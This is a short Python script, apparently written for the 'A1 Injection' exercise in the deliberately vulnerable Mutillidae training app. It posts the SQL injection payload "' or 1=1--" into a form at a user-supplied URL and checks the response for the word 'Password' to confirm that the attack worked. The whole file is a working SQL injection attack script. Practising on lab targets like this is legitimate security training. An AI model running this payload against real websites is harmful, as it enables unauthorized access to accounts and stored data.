#!/usr/bin/python
# coding:utf-8
# @author:pengfei filename:Injection.py

"""
	To solve the A1 Injection problem in Mutillidae
"""
from webBrowser import FormInjectionBrowser
from optparse import OptionParser

if __name__ == "__main__":

	parser = OptionParser()
	parser.add_option('-u','--url',dest='url',help='the web url which you want check with SQLi') # the test url is http://10.10.10.134/mutillidae/index.php?page=user-info.php
	(options,args) = parser.parse_args()

	injectData = ["' or 1=1--"]
	expectData = ["Password"]

	fi = FormInjectionBrowser(options.url,injectData,expectData)
	fi.Inject()
	fi.close()